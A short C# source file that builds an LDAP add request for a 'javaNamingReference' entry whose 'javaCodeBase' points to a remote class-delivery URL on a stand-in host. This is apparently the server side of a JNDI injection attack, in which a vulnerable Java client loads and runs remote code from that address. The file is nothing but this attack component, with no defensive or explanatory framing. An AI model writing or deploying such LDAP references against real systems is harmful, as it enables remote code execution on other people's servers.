using System.DirectoryServices.Protocols;
class LdapReference {
    public static AddRequest Build(string dn) {
        return new AddRequest(dn,
            new DirectoryAttribute("objectClass", "javaNamingReference"),
            new DirectoryAttribute("javaFactory", "RenamedFactory"),
            new DirectoryAttribute("javaCodeBase", "https://delivery.example.invalid/classes/"));
    }
}
